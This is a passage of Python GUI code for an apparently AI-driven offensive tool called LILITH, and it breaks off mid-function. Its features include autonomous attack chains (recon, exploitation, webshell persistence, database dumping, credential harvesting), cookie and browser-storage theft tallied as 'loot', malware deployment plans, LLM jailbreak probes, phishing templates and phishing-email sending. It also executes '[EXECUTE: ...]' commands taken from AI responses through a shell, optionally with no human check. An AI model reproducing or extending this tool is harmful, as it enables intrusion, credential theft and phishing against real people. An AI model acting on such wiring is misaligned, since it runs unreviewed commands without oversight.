        self.browser_stop_btn = QPushButton("■ STOP")
        self.browser_stop_btn.clicked.connect(self.stop_browser)
        self.browser_stop_btn.setStyleSheet("background-color: #660000;")
        browser_btn_row1.addWidget(self.browser_stop_btn)
        
        browser_layout.addLayout(browser_btn_row1)
        
        # Navigate input
        nav_layout = QHBoxLayout()
        self.browser_url_input = QLineEdit()
        self.browser_url_input.setPlaceholderText("URL to navigate...")
        # Pre-fill from attack config
        if self.attack_config.get('target'):
            self.browser_url_input.setText(self.attack_config.get('target'))
        self.browser_url_input.returnPressed.connect(self.browser_navigate)
        nav_layout.addWidget(self.browser_url_input)
        
        nav_btn = QPushButton("GO")
        nav_btn.clicked.connect(self.browser_navigate)
        nav_btn.setMaximumWidth(40)
        nav_layout.addWidget(nav_btn)
        browser_layout.addLayout(nav_layout)
        
        # Browser action buttons
        browser_btn_row2 = QHBoxLayout()
        
        screenshot_btn = QPushButton("📷")
        screenshot_btn.setToolTip("Take Screenshot")
        screenshot_btn.clicked.connect(self.browser_screenshot)
        screenshot_btn.setMaximumWidth(40)
        browser_btn_row2.addWidget(screenshot_btn)
        
        cookies_btn = QPushButton("🍪")
        cookies_btn.setToolTip("Extract Cookies")
        cookies_btn.clicked.connect(self.browser_extract_cookies)
        cookies_btn.setMaximumWidth(40)
        browser_btn_row2.addWidget(cookies_btn)
        
        storage_btn = QPushButton("💾")
        storage_btn.setToolTip("Get Storage")
        storage_btn.clicked.connect(self.browser_get_storage)
        storage_btn.setMaximumWidth(40)
        browser_btn_row2.addWidget(storage_btn)
        
        content_btn = QPushButton("📄")
        content_btn.setToolTip("Get Page Content")
        content_btn.clicked.connect(self.browser_get_content)
        content_btn.setMaximumWidth(40)
        browser_btn_row2.addWidget(content_btn)
        
        browser_layout.addLayout(browser_btn_row2)
        
        panel.addWidget(browser_group)
        
        # ===== MONITORING & LOGS =====
        title = QLabel("MONITORING & LOGS")
        title_font = QFont("Courier New", 12, QFont.Bold)
        title.setFont(title_font)
        panel.addWidget(title)
        
        # Logs
        self.logs_display = QTextEdit()
        self.logs_display.setReadOnly(True)
        panel.addWidget(self.logs_display)
        
        # Controls
        clear_btn = QPushButton("Clear Logs")
        clear_btn.clicked.connect(lambda: self.logs_display.clear())
        panel.addWidget(clear_btn)
        
        return panel
    
    # ===== BROWSER CONTROL METHODS =====
    
    def start_browser(self):
        """Start the browser automation"""
        def _start():
            try:
                headless = self.attack_config.get('headless', False)
                response = requests.post(
                    f"{self.backend_url}/browser/start",
                    json={'headless': headless},
                    timeout=30
                )
                if response.ok:
                    result = response.json()
                    self.browser_active = True
                    self.browser_signal.emit({'status': 'started', 'data': result})
                    self.log_signal.emit(f"Browser started: {result.get('status')}")
                    
                    # Auto-navigate to target if configured
                    target = self.attack_config.get('target')
                    if target:
                        self.browser_url_input.setText(target)
                        self._do_navigate(target)
                else:
                    self.log_signal.emit(f"Browser start failed: {response.text}")
            except Exception as e:
                self.log_signal.emit(f"Browser error: {str(e)}")
        
        threading.Thread(target=_start, daemon=True).start()
    
    def stop_browser(self):
        """Stop the browser"""
        def _stop():
            try:
                response = requests.post(f"{self.backend_url}/browser/stop", timeout=10)
                self.browser_active = False
                self.browser_signal.emit({'status': 'stopped'})
                self.log_signal.emit("Browser stopped")
            except Exception as e:
                self.log_signal.emit(f"Error stopping browser: {str(e)}")
        
        threading.Thread(target=_stop, daemon=True).start()
    
    def browser_navigate(self):
        """Navigate to URL"""
        url = self.browser_url_input.text().strip()
        if url:
            # Auto-add https:// if missing
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
                self.browser_url_input.setText(url)
            threading.Thread(target=self._do_navigate, args=(url,), daemon=True).start()
    
    def _do_navigate(self, url):
        try:
            # Validate URL before sending
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
            
            self.log_signal.emit(f"Navigating to: {url}")
            response = requests.post(
                f"{self.backend_url}/browser/navigate",
                json={'url': url},
                timeout=30
            )
            if response.ok:
                result = response.json()
                self.log_signal.emit(f"Navigated to: {result.get('title', url)}")
                self.browser_signal.emit({'status': 'navigated', 'data': result})
                
                # Auto-extract based on mode
                if self.attack_config.get('cookies', True):
                    self._do_extract_cookies()
            else:
                self.log_signal.emit(f"Navigate failed: {response.text}")
        except Exception as e:
            self.log_signal.emit(f"Navigate error: {str(e)}")
    
    def browser_screenshot(self):
        """Take screenshot"""
        def _screenshot():
            try:
                response = requests.post(f"{self.backend_url}/browser/screenshot", json={}, timeout=30)
                if response.ok:
                    result = response.json()
                    self.log_signal.emit(f"Screenshot saved: {result.get('path')}")
                else:
                    self.log_signal.emit(f"Screenshot failed: {response.text}")
            except Exception as e:
                self.log_signal.emit(f"Screenshot error: {str(e)}")
        
        threading.Thread(target=_screenshot, daemon=True).start()
    
    def browser_extract_cookies(self):
        """Extract cookies from browser"""
        threading.Thread(target=self._do_extract_cookies, daemon=True).start()
    
    def _do_extract_cookies(self):
        try:
            response = requests.get(f"{self.backend_url}/browser/cookies", timeout=10)
            if response.ok:
                result = response.json()
                cookies = result.get('cookies', [])
                self.log_signal.emit(f"🍪 Extracted {len(cookies)} cookies")
                
                # Update loot counter
                self.loot['cookies'] += len(cookies)
                self.update_loot_display()
                
                # Format cookies for display
                cookie_text = "=== 🍪 EXTRACTED COOKIES ===\n\n"
                for c in cookies:
                    cookie_text += f"[{c.get('domain')}]\n"
                    cookie_text += f"  {c.get('name')} = {c.get('value')[:50]}...\n"
                    cookie_text += f"  httpOnly: {c.get('httpOnly')}, secure: {c.get('secure')}\n\n"
                
                self.results_signal.emit(cookie_text)
                self.status_bar.showMessage(f"🍪 Captured {len(cookies)} cookies! Total loot: {self.loot['cookies']} cookies")
        except Exception as e:
            self.log_signal.emit(f"Cookie extraction error: {str(e)}")
    
    def browser_get_storage(self):
        """Get localStorage/sessionStorage"""
        def _get_storage():
            try:
                response = requests.get(f"{self.backend_url}/browser/storage", timeout=10)
                if response.ok:
                    result = response.json()
                    local = result.get('localStorage', {})
                    session = result.get('sessionStorage', {})
                    
                    storage_text = "=== BROWSER STORAGE ===\n\n"
                    storage_text += "--- localStorage ---\n"
                    for k, v in local.items():
                        storage_text += f"  {k}: {str(v)[:100]}\n"
                    storage_text += "\n--- sessionStorage ---\n"
                    for k, v in session.items():
                        storage_text += f"  {k}: {str(v)[:100]}\n"
                    
                    self.results_signal.emit(storage_text)
                    self.log_signal.emit(f"Storage: {len(local)} local, {len(session)} session items")
            except Exception as e:
                self.log_signal.emit(f"Storage error: {str(e)}")
        
        threading.Thread(target=_get_storage, daemon=True).start()
    
    def browser_get_content(self):
        """Get page content"""
        def _get_content():
            try:
                response = requests.get(f"{self.backend_url}/browser/content", timeout=10)
                if response.ok:
                    result = response.json()
                    content = result.get('content', '')[:5000]
                    self.results_signal.emit(f"=== PAGE CONTENT ===\n\n{content}...")
                    self.log_signal.emit(f"Got page content ({len(content)} chars)")
            except Exception as e:
                self.log_signal.emit(f"Content error: {str(e)}")
        
        threading.Thread(target=_get_content, daemon=True).start()
    
    def _update_browser_status(self, data):
        """Update browser status indicator"""
        status = data.get('status', 'unknown')
        if status == 'started':
            self.browser_indicator.setText("🌐 BROWSER: ACTIVE")
            self.browser_indicator.setStyleSheet("color: #00ff00; padding: 5px;")
            self.browser_status_label.setText("Status: Running")
            self.browser_status_label.setStyleSheet("color: #00ff00;")
        elif status == 'stopped':
            self.browser_indicator.setText("🌐 BROWSER: OFFLINE")
            self.browser_indicator.setStyleSheet("color: #666; padding: 5px;")
            self.browser_status_label.setText("Status: Stopped")
            self.browser_status_label.setStyleSheet("color: #666;")
        elif status == 'navigated':
            nav_data = data.get('data', {})
            self.browser_status_label.setText(f"Page: {nav_data.get('title', 'Unknown')[:30]}")
    
    def _init_attack_mode(self):
        """Initialize based on selected attack mode"""
        mode = self.attack_config.get('mode')
        target = self.attack_config.get('target')
        
        self.log_signal.emit(f"Initializing attack mode: {self.attack_config.get('mode_name')}")
        
        if target:
            self.log_signal.emit(f"Target configured: {target}")
        
        # Auto-start browser for browser-based modes
        if mode in ['remote_unauth', 'remote_auth', 'browser_hijack']:
            self.log_signal.emit("Auto-starting browser for web attack mode...")
            import time
            time.sleep(2)  # Wait for UI to be ready
            self.start_browser()
    
    def log(self, msg, color=None):
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_msg = f"[{timestamp}] {msg}"
        
        self.logs_display.append(log_msg)
        
        # Auto-scroll
        self.logs_display.verticalScrollBar().setValue(
            self.logs_display.verticalScrollBar().maximum()
        )
    
    # Thread-safe UI update slots
    def _update_log(self, msg):
        self.log(msg)
    
    def _update_results(self, text):
        self.results_display.setText(text)
    
    def _update_lilith(self, text):
        self.lilith_output.append(text)
    
    def _update_comm(self, text):
        self.comm_display.setText(text)
    
    def _update_commands(self, commands):
        """Add detected commands to the command queue"""
        for cmd in commands:
            item = QListWidgetItem(cmd)
            item.setData(Qt.UserRole, cmd)
            self.command_list.addItem(item)
        
        # Auto-execute if enabled
        if self.auto_execute and commands:
            self.execute_all_commands()
    
    def _update_status_display(self, status):
        """Update the LILITH status indicator with AI provider info"""
        if status.get('status') == 'online':
            # Get AI provider info
            ai_providers = status.get('ai_providers', {})
            providers = ai_providers.get('providers', [])
            active_count = ai_providers.get('active_count', 0)
            total_count = ai_providers.get('total_count', 0)
            
            # Find first working provider
            active_provider = None
            for p in providers:
                if p.get('is_available'):
                    active_provider = p
                    break
            
            if active_provider:
                provider_name = active_provider.get('name', 'Unknown')
                model = active_provider.get('model', 'Unknown')
                # Shorten model name if too long
                if len(model) > 25:
                    model = model[:22] + '...'
                self.lilith_status_label.setText(f"● ONLINE [{provider_name}] {model} ({active_count}/{total_count} AI)")
            else:
                self.lilith_status_label.setText(f"● ONLINE - {status.get('model', 'Unknown')}")
            self.lilith_status_label.setStyleSheet("color: #00ff00; font-weight: bold;")
        else:
            self.lilith_status_label.setText("● OFFLINE")
            self.lilith_status_label.setStyleSheet("color: #ff0000; font-weight: bold;")
    
    def _update_terminal(self, text):
        """Update terminal display"""
        self.terminal_display.append(text)
        # Auto-scroll
        self.terminal_display.verticalScrollBar().setValue(
            self.terminal_display.verticalScrollBar().maximum()
        )
    
    def _poll_status(self):
        """Poll LILITH backend status"""
        threading.Thread(target=self._poll_status_thread, daemon=True).start()
    
    def _poll_status_thread(self):
        try:
            r = requests.get(f"{self.backend_url}/status", timeout=3)
            if r.status_code == 200:
                self.status_signal.emit(r.json())
            else:
                self.status_signal.emit({'status': 'OFFLINE'})
        except:
            self.status_signal.emit({'status': 'OFFLINE'})
    
    def _toggle_auto_execute(self, state):
        """Toggle auto-execute mode"""
        self.auto_execute = (state == Qt.Checked)
        if self.auto_execute:
            self.log("⚠️ Auto-execute ENABLED - commands will run automatically!")
        else:
            self.log("Auto-execute disabled")
    
    def parse_execute_commands(self, text):
        """Extract [EXECUTE: ...] commands from LILITH response"""
        pattern = r'\\[EXECUTE:\\s*(.+?)\\]'
        return re.findall(pattern, text)
    
    def execute_selected_command(self):
        """Execute the selected command from the list"""
        item = self.command_list.currentItem()
        if not item:
            self.log("No command selected")
            return
        
        cmd = item.data(Qt.UserRole)
        self.log(f"Executing: {cmd}")
        threading.Thread(target=self._execute_command_thread, args=(cmd,), daemon=True).start()
        self.command_list.takeItem(self.command_list.row(item))
    
    def execute_all_commands(self):
        """Execute all commands in the queue"""
        if self.command_list.count() == 0:
            self.log("No commands in queue")
            return
        
        commands = []
        while self.command_list.count() > 0:
            item = self.command_list.takeItem(0)
            commands.append(item.data(Qt.UserRole))
        
        self.log(f"Executing {len(commands)} command(s)...")
        for cmd in commands:
            threading.Thread(target=self._execute_command_thread, args=(cmd,), daemon=True).start()
    
    def execute_direct_command(self):
        """Execute a command typed directly in the terminal input"""
        cmd = self.direct_cmd_input.text()
        if not cmd:
            return
        self.direct_cmd_input.clear()
        self.log(f"Direct execute: {cmd}")
        threading.Thread(target=self._execute_command_thread, args=(cmd,), daemon=True).start()
    
    def _execute_command_thread(self, cmd):
        """Execute a command and log results"""
        # Remove /bash prefix if present
        if cmd.startswith('/bash '):
            cmd = cmd[6:]
        
        try:
            self.log_signal.emit(f"[CMD] {cmd}")
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=300
            )
            output = result.stdout + result.stderr
            
            # Format for terminal display
            timestamp = datetime.now().strftime("%H:%M:%S")
            terminal_output = f"\n[{timestamp}] $ {cmd}\n{output if output else '(no output)'}\n{'─'*50}"
            
            # Update terminal display (thread-safe)
            self.terminal_signal.emit(terminal_output)
            
            if output:
                self.log_signal.emit(f"[OK] Command completed")
            else:
                self.log_signal.emit(f"[OK] Command completed (no output)")
        except subprocess.TimeoutExpired:
            self.log_signal.emit(f"[TIMEOUT] Command timed out after 300s")
            self.terminal_signal.emit(f"\n[TIMEOUT] {cmd} - timed out after 300s\n{'─'*50}")
        except Exception as e:
            self.log_signal.emit(f"[ERROR] {str(e)}")
            self.terminal_signal.emit(f"\n[ERROR] {cmd}\n{str(e)}\n{'─'*50}")
    
    # ===== AUTONOMOUS ATTACK METHODS =====
    
    def start_autonomous_attack(self):
        """Start one-click autonomous attack chain"""
        target = self.target_input.text().strip()
        if not target:
            QMessageBox.warning(self, "No Target", "Please enter a target URL or IP")
            self.status_bar.showMessage("⚠ No target specified!")
            return
        
        chain_type = self.chain_type.currentText()
        stealth_mode = self.stealth_mode.currentText()
        
        self.log(f"🚀 STARTING AUTONOMOUS ATTACK: {target}")
        self.log(f"   Chain: {chain_type} | Stealth: {stealth_mode}")
        self.status_bar.showMessage(f"⚡ Autonomous attack started on {target}")
        
        # Update UI
        self.results_signal.emit(f"=== AUTONOMOUS ATTACK INITIATED ===\n\nTarget: {target}\nChain: {chain_type}\nStealth: {stealth_mode}\n\nPhases:\n1. RECON - Enumerate, fingerprint, gather intel\n2. SCAN - Ports, directories, vulnerabilities\n3. EXPLOIT - SQLi, XSS, Auth bypass, File upload\n4. PERSIST - Webshell, backdoor, cron\n5. EXFIL - Dump DB, harvest creds, steal files\n\n--- ATTACK LOG ---\n")
        
        threading.Thread(
            target=self._autonomous_attack_thread,
            args=(target, chain_type, stealth_mode),
            daemon=True
        ).start()
    
    def _autonomous_attack_thread(self, target, chain_type, stealth_mode):
        """Execute autonomous attack in background"""
        try:
            response = requests.post(
                f"{self.backend_url}/agent/autonomous/start",
                json={
                    'target': target,
                    'chain_type': chain_type,
                    'stealth_mode': stealth_mode
                },
                timeout=30
            )
            
            if response.ok:
                data = response.json()
                self.log_signal.emit(f"✓ Attack started: {data.get('tasks_planned', 0)} tasks planned")
                
                suggestion = data.get('suggestion', {})
                if suggestion.get('suggestion'):
                    self.lilith_signal.emit(f"💡 MEMORY SUGGESTION:\n{suggestion['suggestion']}\nConfidence: {suggestion.get('confidence', 0):.0%}")
                
                # Poll for status updates
                self._poll_autonomous_status()
            else:
                self.log_signal.emit(f"✗ Failed to start: {response.text}")
                
        except requests.exceptions.ConnectionError:
            self.log_signal.emit("✗ Backend not running! Start lilith_complete.py first")
        except Exception as e:
            self.log_signal.emit(f"✗ Error: {str(e)}")
    
    def _poll_autonomous_status(self):
        """Poll autonomous agent status"""
        try:
            response = requests.get(f"{self.backend_url}/agent/autonomous/status", timeout=10)
            if response.ok:
                status = response.json()
                
                # Update status display
                victories = status.get('victories', [])
                if victories:
                    self.log_signal.emit(f"🏆 VICTORIES: {', '.join(victories)}")
                    for v in victories:
                        self.results_signal.emit(f"\n🏆 VICTORY: {v}\n")
                
                # Update memory stats
                mem_stats = status.get('memory_stats', {})
                if mem_stats:
                    self.status_bar.showMessage(
                        f"Attacks: {mem_stats.get('total_attacks', 0)} | "
                        f"Success: {mem_stats.get('success_rate', 0):.0%} | "
                        f"Loot: {mem_stats.get('loot_items', 0)}"
                    )
        except:
            pass
    
    def stop_autonomous_attack(self):
        """Stop the autonomous attack"""
        self.log("⏹ Stopping autonomous attack...")
        
        def _stop():
            try:
                response = requests.post(f"{self.backend_url}/agent/autonomous/stop", timeout=10)
                if response.ok:
                    self.log_signal.emit("✓ Attack stopped")
                    self.status_bar.showMessage("Attack stopped")
            except Exception as e:
                self.log_signal.emit(f"Stop error: {e}")
        
        threading.Thread(target=_stop, daemon=True).start()
    
    def get_attack_suggestion(self):
        """Get AI suggestion based on attack memory"""
        target = self.target_input.text().strip()
        
        def _get_suggestion():
            try:
                response = requests.post(
                    f"{self.backend_url}/agent/memory/suggest",
                    json={'domain': target},
                    timeout=10
                )
                if response.ok:
                    data = response.json()
                    suggestion = data.get('suggestion', 'No suggestion available')
                    attacks = data.get('attacks', [])
                    
                    text = f"💡 ATTACK SUGGESTION:\n{suggestion}\n\n"
                    if attacks:
                        text += "Previously successful attacks on similar targets:\n"
                        for a in attacks[:3]:
                            text += f"  • {a['type']}: {a['vector']} (worked {a['successes']}x)\n"
                    
                    self.lilith_signal.emit(text)
            except Exception as e:
                self.log_signal.emit(f"Suggestion error: {e}")
        
        threading.Thread(target=_get_suggestion, daemon=True).start()
    
    def analyze_target(self):
        target = self.target_input.text()
        if not target:
            self.log("No target specified")
            return
        
        self.log(f"Analyzing target: {target}")
        threading.Thread(
            target=self._analyze_thread,
            args=(target,),
            daemon=True
        ).start()
    
    def _analyze_thread(self, target):
        try:
            response = requests.post(
                f"{self.backend_url}/analyze_target",
                json={"target": {"address": target}},
                timeout=120
            )
            
            if response.status_code == 200:
                data = response.json()
                analysis = data.get('analysis', 'No analysis')
                self.results_signal.emit(analysis)
                self.log_signal.emit("Target analysis complete")
            else:
                self.log_signal.emit(f"Analysis failed: {response.status_code}")
        except Exception as e:
            self.log_signal.emit(f"Error: {str(e)}")
    
    def generate_chain(self):
        target = self.target_input.text()
        if not target:
            self.log("No target specified")
            return
        
        self.log(f"Generating attack chain for {target}")
        threading.Thread(
            target=self._chain_thread,
            args=(target,),
            daemon=True
        ).start()
    
    def _chain_thread(self, target):
        try:
            response = requests.post(
                f"{self.backend_url}/attack_chain",
                json={
                    "target": target,
                    "objective": "Full compromise"
                },
                timeout=120
            )
            
            if response.status_code == 200:
                data = response.json()
                chain = data.get('attack_chain', 'No chain')
                self.results_signal.emit(chain)
                self.log_signal.emit("Attack chain generated")
            else:
                self.log_signal.emit("Chain generation failed")
        except Exception as e:
            self.log_signal.emit(f"Error: {str(e)}")
    
    def execute_attack(self):
        target = self.target_input.text()
        module = self.attack_module.currentText()
        
        if not target:
            self.log("No target specified")
            return
        
        self.log(f"Executing {module} on {target}")
        self.log("Attack in progress - Monitoring results...")
    
    def run_garak(self):
        self.log("Running Garak vulnerability scanner")
        threading.Thread(target=self._garak_thread, daemon=True).start()
    
    def _garak_thread(self):
        try:
            model = self.model or 'meta-llama/Llama-3.3-70B-Instruct-Turbo'
            response = requests.post(
                f"{self.backend_url}/garak_scan",
                json={
                    "model": model,
                    "probes": ["dan", "injection", "encoding", "malwaregen"]
                },
                timeout=300
            )
            
            if response.status_code == 200:
                data = response.json()
                self.results_signal.emit(json.dumps(data, indent=2))
                self.log_signal.emit("Garak scan complete")
        except Exception as e:
            self.log_signal.emit(f"Garak error: {str(e)}")
    
    def run_kawaii(self):
        self.log("Running KawaiiGPT jailbreak analysis")
        threading.Thread(target=self._kawaii_thread, daemon=True).start()
    
    def _kawaii_thread(self):
        try:
            model = self.model or 'meta-llama/Llama-3.3-70B-Instruct-Turbo'
            response = requests.post(
                f"{self.backend_url}/profile_model",
                json={
                    "model": model,
                    "test_cases": "jailbreak,injection,evasion"
                },
                timeout=120
            )
            
            if response.status_code == 200:
                data = response.json()
                self.results_signal.emit(json.dumps(data, indent=2))
                self.log_signal.emit("KawaiiGPT analysis complete")
        except Exception as e:
            self.log_signal.emit(f"Analysis error: {str(e)}")
    
    def generate_communication(self):
        self.log("Generating social engineering templates")
        threading.Thread(target=self._comm_thread, daemon=True).start()
    
    def _comm_thread(self):
        try:
            response = requests.post(
                f"{self.backend_url}/generate_communication",
                json={
                    "attack_type": "Phishing",
                    "organization": "Target Organization",
                    "objective": "Initial access"
                },
                timeout=120
            )
            
            if response.status_code == 200:
                data = response.json()
                comm = data.get('communication', 'No template')
                self.comm_signal.emit(comm)
                self.log_signal.emit("Communication template generated")
        except Exception as e:
            self.log_signal.emit(f"Error: {str(e)}")

    def _fetch_backend_model(self):
        try:
            r = requests.get(f"{self.backend_url}/status", timeout=5)
            if r.status_code == 200:
                data = r.json()
                self.model = data.get('model') or self.model
                self.log_signal.emit(f"Detected backend model: {self.model}")
        except Exception:
            pass

    def query_lilith(self):
        q = self.lilith_input.text()
        if not q:
            return
        
        self.lilith_input.clear()
        self.lilith_output.append(f"\nYOU: {q}\n")
        
        threading.Thread(target=self._lilith_thread, args=(q,), daemon=True).start()
    
    def _lilith_thread(self, query):
        try:
            self.log_signal.emit("Querying LILITH...")
            response = requests.post(
                f"{self.backend_url}/chat",
                json={"message": query},
                timeout=120
            )
            
            if response.status_code == 200:
                data = response.json()
                ai_response = data.get('response', 'No response')
                provider = data.get('provider', 'Unknown')
                model = data.get('model', '')
                
                # Show which AI responded
                provider_info = f"[{provider}]" if provider else ""
                self.lilith_signal.emit(f"LILITH {provider_info}: {ai_response}\n")
                
                if provider:
                    self.log_signal.emit(f"Response from {provider} ({model[:30]}...)" if len(model) > 30 else f"Response from {provider} ({model})")
                
                # Parse for executable commands
                pattern = r'\[EXECUTE:\s*(.+?)\]'
                commands = re.findall(pattern, ai_response)
                if commands:
                    self.log_signal.emit(f"Found {len(commands)} executable command(s)")
                    self.command_signal.emit(commands)
            else:
                self.lilith_signal.emit(f"ERROR: HTTP {response.status_code}\n")
        except Exception as e:
            self.lilith_signal.emit(f"ERROR: {str(e)}\n")
    
    def deploy_malware(self):
        malware_type = self.malware_type.currentText().lower().replace(' ', '_')
        target = self.target_input.text()
        
        if not target:
            self.log("No target specified")
            return
        
        self.log(f"Deploying {malware_type} malware on {target}")
        threading.Thread(
            target=self._deploy_malware_thread,
            args=(malware_type, target),
            daemon=True
        ).start()
    
    def _deploy_malware_thread(self, malware_type, target):
        try:
            response = requests.post(
                f"{self.backend_url}/deploy_malware",
                json={"malware_type": malware_type, "target": target},
                timeout=120
            )
            
            if response.status_code == 200:
                data = response.json()
                plan = data.get('plan', '')
                self.results_signal.emit(f"=== {malware_type.upper()} MALWARE PLAN ===\n\nTarget: {target}\n\n{plan}")
                self.log_signal.emit("Malware plan generated")
                
                # Parse for executable commands
                pattern = r'\[EXECUTE:\s*(.+?)\]'
                commands = re.findall(pattern, plan)
                if commands:
                    self.log_signal.emit(f"Found {len(commands)} executable command(s)")
                    self.command_signal.emit(commands)
            else:
                self.log_signal.emit(f"Malware deployment failed: {response.status_code}")
        except Exception as e:
            self.log_signal.emit(f"Error: {str(e)}")
    
    def deploy_advanced_attack(self):
        attack_type = self.advanced_attack_type.currentText().lower().replace(' ', '_').replace('/', '_').replace('&', 'and')
        target = self.target_input.text()
        
        if not target:
            self.log("No target specified")
            return
        
        self.log(f"Deploying {attack_type} attack on {target}")
        threading.Thread(
            target=self._deploy_advanced_attack_thread,
            args=(attack_type, target),
            daemon=True
        ).start()
    
    def _deploy_advanced_attack_thread(self, attack_type, target):
        try:
            response = requests.post(
                f"{self.backend_url}/deploy_advanced_attack",
                json={"attack_type": attack_type, "target": target},
                timeout=120
            )
            
            if response.status_code == 200:
                data = response.json()
                # Show the AI plan in results
                ai_plan = data.get('ai_plan', '')
                self.results_signal.emit(f"=== {attack_type.upper()} ATTACK PLAN ===\n\n{ai_plan}")
                self.log_signal.emit("Advanced attack plan generated")
                
                # Parse for executable commands and add to queue
                pattern = r'\[EXECUTE:\s*(.+?)\]'
                commands = re.findall(pattern, ai_plan)
                if commands:
                    self.log_signal.emit(f"Found {len(commands)} executable command(s)")
                    self.command_signal.emit(commands)
            else:
                self.log_signal.emit(f"Advanced attack deployment failed: {response.status_code}")
        except Exception as e:
            self.log_signal.emit(f"Error: {str(e)}")
    
    def get_ai_recommendation(self):
        target = self.target_input.text()
        objective = "Full compromise"  # Could be made configurable
        
        if not target:
            self.log("No target specified")
            return
        
        self.log(f"Getting AI recommendation for {target}")
        threading.Thread(
            target=self._get_ai_recommendation_thread,
            args=(target, objective),
            daemon=True
        ).start()
    
    def _get_ai_recommendation_thread(self, target, objective):
        try:
            response = requests.post(
                f"{self.backend_url}/recommend_attack",
                json={"target": target, "objective": objective},
                timeout=120
            )
            
            if response.status_code == 200:
                data = response.json()
                attack_route = data.get('attack_route', 'No recommendation')
                self.results_signal.emit(f"=== AI ATTACK RECOMMENDATION ===\n\nTarget: {target}\nObjective: {objective}\n\n{attack_route}")
                self.log_signal.emit("AI recommendation received")
                
                # Parse for executable commands
                pattern = r'\[EXECUTE:\s*(.+?)\]'
                commands = re.findall(pattern, attack_route)
                if commands:
                    self.log_signal.emit(f"Found {len(commands)} executable command(s)")
                    self.command_signal.emit(commands)
            else:
                self.log_signal.emit(f"AI recommendation failed: {response.status_code}")
        except Exception as e:
            self.log_signal.emit(f"Error: {str(e)}")
    
    def deploy_ai_attack(self):
        # This would deploy the attack route shown in results_display
        attack_route = self.results_display.toPlainText()
        
        if not attack_route or attack_route == "No recommendation":
            self.log("No attack route to deploy")
            return
        
        self.log("Deploying AI-recommended attack")
        threading.Thread(
            target=self._deploy_ai_attack_thread,
            args=(attack_route,),
            daemon=True
        ).start()
    
    def _deploy_ai_attack_thread(self, attack_route):
        try:
            self.log_signal.emit("Deploying AI attack route...")
            response = requests.post(
                f"{self.backend_url}/deploy_attack",
                json={"attack_route": attack_route},
                timeout=180
            )
            
            if response.status_code == 200:
                data = response.json()
                results = data.get('results', [])
                
                # Format results for display
                output = "=== AI ATTACK EXECUTION RESULTS ===\n\n"
                for r in results:
                    cmd = r.get('command', 'unknown')
                    success = r.get('success', False)
                    stdout = r.get('stdout', '')
                    stderr = r.get('stderr', '')
                    error = r.get('error', '')
                    
                    status = "✓" if success else "✗"
                    output += f"{status} {cmd}\n"
                    if stdout:
                        output += f"   Output: {stdout[:500]}\n"
                    if stderr:
                        output += f"   Error: {stderr[:200]}\n"
                    if error:
                        output += f"   Exception: {error}\n"
                    output += "\n"
                
                self.results_signal.emit(output)
                self.log_signal.emit(f"AI attack completed: {data.get('commands_executed', 0)} commands executed")
            else:
                self.log_signal.emit(f"AI attack deployment failed: {response.status_code}")
        except Exception as e:
            self.log_signal.emit(f"Error: {str(e)}")
    
    def start_autogpt_loop(self):
        initial_prompt = f"Target: {self.target_input.text()}\nObjective: Full compromise"
        
        if not self.target_input.text():
            self.log("No target specified")
            return
        
        self.log("Starting AutoGPT autonomous attack loop")
        threading.Thread(
            target=self._autogpt_loop_thread,
            args=(initial_prompt,),
            daemon=True
        ).start()
    
    def _autogpt_loop_thread(self, initial_prompt):
        try:
            self.log_signal.emit("AutoGPT loop starting - this may take several minutes...")
            response = requests.post(
                f"{self.backend_url}/autogpt_loop",
                json={"initial_prompt": initial_prompt, "max_iterations": 10},
                timeout=600  # 10 minutes for autonomous loop
            )
            
            if response.status_code == 200:
                data = response.json()
                iterations = data.get('iterations', 0)
                memory = data.get('memory', [])
                
                # Format AutoGPT results
                output = "=== AUTOGPT AUTONOMOUS LOOP RESULTS ===\n\n"
                output += f"Total Iterations: {iterations}\n\n"
                
                for m in memory:
                    output += f"--- Iteration {m.get('iteration', '?')} ---\n"
                    output += f"Action: {m.get('action', '')[:300]}\n"
                    output += f"Result: {str(m.get('result', ''))[:200]}\n"
                    output += f"Critique: {m.get('critique', '')[:200]}\n\n"
                
                self.results_signal.emit(output)
                self.log_signal.emit(f"AutoGPT loop completed: {iterations} iterations")
                
                # Collect any commands from all iterations
                all_commands = []
                for m in memory:
                    action = str(m.get('action', ''))
                    pattern = r'\[EXECUTE:\s*(.+?)\]'
                    commands = re.findall(pattern, action)
                    all_commands.extend(commands)
                
                if all_commands:
                    self.log_signal.emit(f"Found {len(all_commands)} total command(s) from AutoGPT")
                    self.command_signal.emit(all_commands)
            else:
                self.log_signal.emit(f"AutoGPT loop failed: {response.status_code}")
        except requests.exceptions.Timeout:
            self.log_signal.emit("AutoGPT loop timed out after 10 minutes")
        except Exception as e:
            self.log_signal.emit(f"Error: {str(e)}")
    
    # ===== EMAIL AUTOMATION METHODS =====
    
    def _email_log(self, msg):
        """Log to email output display"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.email_output.append(f"[{timestamp}] {msg}")
    
    def get_disposable_email(self):
        """Get a disposable email address"""
        self._email_log("Getting disposable email...")
        threading.Thread(target=self._get_disposable_email_thread, daemon=True).start()
    
    def _get_disposable_email_thread(self):
        try:
            response = requests.post(f"{self.backend_url}/email/disposable", timeout=30)
            if response.ok:
                data = response.json()
                if data.get('success'):
                    email = data.get('email')
                    # Update UI (thread-safe via signal)
                    self.log_signal.emit(f"Got disposable email: {email}")
                    # Update label directly using QMetaObject
                    from PyQt5.QtCore import QMetaObject, Q_ARG, Qt
                    QMetaObject.invokeMethod(self.current_email_label, "setText",
                        Qt.QueuedConnection, Q_ARG(str, f"Current: {email}"))
                    QMetaObject.invokeMethod(self.email_output, "append",
                        Qt.QueuedConnection, Q_ARG(str, f"[OK] Disposable email ready: {email}"))
                else:
                    self.log_signal.emit(f"Failed: {data.get('error')}")
            else:
                self.log_signal.emit(f"Email API error: {response.status_code}")
        except Exception as e:
            self.log_signal.emit(f"Email error: {str(e)}")
    
    def send_phishing_email(self):
        """Send a phishing email using template"""
        to = self.phish_to.text().strip()
        template = self.phish_template.currentText()
        attack_url = self.phish_attack_url.text().strip()
        
        if not to:
            QMessageBox.warning(self, "Error", "Please enter a target email address")
            return
        if not attack_url:
            QMessageBox.warning(self, "Error", "Please enter an attack URL (credential harvester)")
            return
        
        self._email_log(f"Sending {template} phish to {to}...")
        threading.Thread(
